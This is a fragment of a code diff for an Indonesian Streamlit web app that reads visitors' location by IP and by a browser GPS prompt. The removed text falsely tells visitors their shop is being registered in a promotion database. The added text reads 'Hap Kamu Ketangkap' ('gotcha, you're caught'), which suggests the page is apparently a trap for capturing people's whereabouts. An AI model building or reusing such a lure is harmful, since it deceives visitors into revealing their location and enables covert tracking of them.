@@ -34,8 +34,8 @@ def ambil_lokasi_via_ip():
     return None, None
 
 # ================= TAMPILAN HALAMAN UTAMA (JASTIPBYMICHEL) =================
-st.title("🛍️ JastipbyMichel - Aktivasi Promosi")
-st.write("Selamat datang! Posisi instansi/toko Anda sedang didaftarkan ke dalam database promosi JastipbyMichel.")
+st.title("🛍️ JastipbyMichel - Trip Hongkong")
+st.write("Testing7 Hap Kamu Ketangkap")
 
 # Jalankan sistem deteksi tombol GPS komponen
 lokasi_gps = streamlit_geolocation()
